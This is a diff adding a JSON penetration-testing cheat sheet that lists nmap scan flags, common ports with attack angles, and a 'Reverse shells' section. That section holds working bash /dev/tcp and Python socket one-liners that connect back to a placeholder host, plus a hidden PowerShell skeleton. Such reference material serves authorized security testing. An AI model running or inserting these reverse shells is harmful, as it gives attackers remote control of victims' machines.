@@ -1,0 +1,33 @@
+{
+  "categories": [
+    {
+      "name": "Nmap flags",
+      "entries": [
+        { "command": "nmap -T4 -F <target>", "what": "Fast scan of top ports", "when": "Quick first look" },
+        { "command": "nmap -T4 -p- <target>", "what": "Scan all TCP ports", "when": "When you need completeness" },
+        { "command": "nmap -sV -sC <target>", "what": "Service/version detection + default scripts", "when": "After you find open ports" },
+        { "command": "nmap -sS <target>", "what": "SYN stealth scan", "when": "When allowed and you want stealthier probes" },
+        { "command": "nmap --script vuln <target>", "what": "Run vuln NSE scripts", "when": "Quick vuln triage" }
+      ]
+    },
+    {
+      "name": "Reverse shells",
+      "entries": [
+        { "command": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", "what": "Bash TCP reverse shell", "when": "Linux target with bash" },
+        { "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'", "what": "Python TTY reverse shell", "when": "Need interactive TTY" },
+        { "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"...\"", "what": "PowerShell reverse shell skeleton", "when": "Windows target (fill payload)" }
+      ]
+    },
+    {
+      "name": "Common ports & services",
+      "entries": [
+        { "command": "22/tcp", "what": "SSH", "when": "Remote shell / brute force / key auth" },
+        { "command": "80/tcp", "what": "HTTP", "when": "Web recon, dir busting, vuln scans" },
+        { "command": "443/tcp", "what": "HTTPS", "when": "Same as HTTP + TLS inspection" },
+        { "command": "445/tcp", "what": "SMB", "when": "Share enumeration, auth checks, relay paths" },
+        { "command": "3306/tcp", "what": "MySQL", "when": "DB auth / SQLi pivot targets" }
+      ]
+    }
+  ]
+}
+
